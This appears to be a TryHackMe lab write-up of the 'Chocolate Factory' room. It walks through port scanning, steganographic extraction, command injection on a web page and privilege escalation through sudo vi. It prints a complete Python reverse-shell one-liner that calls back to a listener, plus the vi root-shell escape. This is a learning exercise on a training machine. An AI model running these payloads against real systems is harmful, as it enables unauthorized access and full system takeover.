**<p align="center">TryHackMe: Chocolate Factory</p>**
---

<p align="center">
<img
src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/golden%20ticket.png" alt="image alt" width="300" />
</p>

**<p align="center">"Welcome to Willy Wonka's Chocolate Factory!"</p>**

[![Day 24 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2024%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)

**Topic:** Web application pentesting

**Completed:** 8/4/2025

“A Charlie And The Chocolate Factory themed room. This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompas.”

<p align="center">+++++++++</p>

I began with a standard Nmap scan using the flags `-sV -sC` to detect service versions and run default scripts. The scan revealed eleven open TCP ports:
```
21  open  ftp        vsftpd 3.0.5
22  open  ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80  open  http       Apache httpd 2.4.41 ((Ubuntu))
100 open  newacct?
106 open  pop3pw?
109 open  pop2?
110 open  pop3?
111 open  rpcbind?
113 open  ident?
119 open  nntp?
125 open  locus-map?
```
The FTP service on port 21 allows anonymous login, offering an early foothold. Port 80 loads a “Squirrel Room” login page when accessed in the browser.
Beyond the standard services, several high ports (100–125) stood out with interesting but suspicious outputs. Most of them returned a fun ASCII banner and a message from Mr. Wonka:
```
"Welcome to chocolate room!!  
___.---------------.  
.'__'__'__'__'__,` . ____ ___  
_:\x20 |:. \x20 ___  
'__'__'__'__'_`.__| `. \x20 ___  
'__'__'__\x20__'_;-----------------`  
|______________________;________________|  

small hint from Mr.Wonka: Look somewhere else, it’s not here! ;)  
hope you won’t drown, Augustus."

```
One of the more promising outputs came from port 113, which returned a URL-like string:
```
http://localhost/key_rev_key <- You will find the key here!!!
```

This hinted that the system might host a local web page not directly accessible from the outside.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%201.png)

After my initial enumeration, I downloaded a `.jpg` image from the TryHackMe lab homepage, suspecting it might contain hidden information or steganographic data. I examined the image using `exiftool`, `binwalk`, `strings`, and `steghide`, but these checks revealed no hidden files or clues.

I then ran a Gobuster scan against the HTTP service at `http://10.201.87.251/` using a common wordlist and file extensions (`php, html, txt`). 

Unfortunately, no accessible directories or files were discovered.

Next, I revisited the FTP service. Using anonymous login, I was able to access and download a `.jpg` file named `gum_room.jpg`.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%202.png)

The image was simply a photo of many sticks of gum.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%203.png)

I decided to dig deeper using steghide, and ran:
```
steghide extract -sf gum_room.jpg
```
Surprisingly, it did not require a passphrase and successfully extracted a text file named `b64.txt`.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%204.png)

The name b64.txt hinted that the contents might be Base64-encoded. I decoded it using:
```
cat b64.txt | base64 -d
```

This revealed a username and a hashed password.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%205.png)

Using Gobuster to enumerate the website again, this time with a more extensive wordlist and file extension options:
```
Gobuster dir -u http://10.201.87.251 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```
The directories `/home.php` and `/validate.php` were uncovered.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%206.png)

Navigating to `/home.php` led to a command execution page. I tested it for command injection by running a basic `id` command followed by `ls -la /home/charlie`. The results confirmed that the page was vulnerable and lacked proper access controls.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%207.png)

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%208.png)

To escalate this into a shell, I prepared a reverse shell payload and set up a Netcat listener on port 5555. The payload used was:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.201.99.122",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```
After executing the payload from the command injection point, I caught the reverse shell and then stabilized it with:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I also located the `key_rev_key` file mentioned earlier.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%209.png)

With local access established, I was able to read the contents of the `key_rev_key` file, which revealed a key.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2010.png)

Next, I explored the `/validate.php` file. Viewing its contents exposed username and password credentials, likely used for authentication on another service.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2011.png)

While navigating Charlie’s home directory, I discovered a file named `teleport`, which turned out to be a private RSA key!

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2012.png)

I copied the RSA key into a local text file, saved it as `charlie_rsa`, and used the following command to secure it with the proper file permissions:
```
chmod 600 charlie_rsa
```

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2013.png)

Using this key, I was able to SSH into the machine as the user Charlie. Once logged in, I successfully located and captured the `user.txt` flag within Charlie’s home directory.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2014.png)

To begin the privilege escalation phase, I ran the sudo -l command to determine which commands the current user (Charlie) could execute with sudo privileges without needing a password. The output revealed that charlie could execute /usr/bin/vi, but not as root due to the !root restriction:
```
User charlie may run the following commands on [machine]:
(ALL : !root) NOPASSWD: /usr/bin/vi
```

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2015.png)

Since the rule explicitly prevents charlie from running the command as root, I couldn’t escalate privileges this way.

I then listed all system users using the command:
```
cat /etc/passwd | cut -d: -f1
```

Among the results was, of course, the root user. Despite the earlier !root restriction, I tested running vi as root using:
```
sudo -u root vi
```

Surprisingly, this bypassed the restriction and opened up vi as root, possibly due to a misconfiguration in the system's sudoers file.

Inside vi, I entered interactive mode by pressing `Shift` + `:` and ran the following to spawn a root shell:
```
:!/bin/bash
```

This escalated me to root access.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2016.png)

Inside the `/root/` directory, I discovered a file named `root.py`, which was supposed to generate the final flag upon entering a key. However, the script appeared to be broken or incomplete, and none of the suggested options or methods worked to execute it properly. After researching alternative solutions, I used an online Fernet decoder. I entered the `encrypted_mess` value from the script into the token field and used the previously discovered key, removing the `b` prefix, in the key field. This approach successfully decrypted the final flag, allowing me to complete the challenge despite the bug.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2017.png)

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Chocolate-Factory/Images/Screenshot%2018.png)

<p align="center">+</p>

**Lessons Learned:**

This room was a valuable exercise in chaining multiple enumeration and privilege escalation techniques together, from leveraging a vulnerable web server, to uncovering credentials, and pivoting via SSH. That said, I do wish the room had been more stable towards the final stage, as the buggy behavior near the end made capturing the root flag feel slightly less satisfying than it could have been. The root flag retrieval ended up being more of a workaround than a clean finish. Still, it was a good reminder to stay patient and adaptable, especially when challenges don’t go as expected.

<p align="center">+++++++++</p>

🔒 Out of respect for the learning experience, I’ve chosen not to share the flag answers directly. Instead, I’ve documented my full process to support both others and myself in understanding the vulnerability.

**Resources**:
- [TryHackMe's Chocolate Factory Room](https://tryhackme.com/room/chocolatefactory)
- [GTFOBins](https://gtfobins.github.io/)
- [Fernet (Decode)](https://asecuritysite.com/encryption/ferdecode)
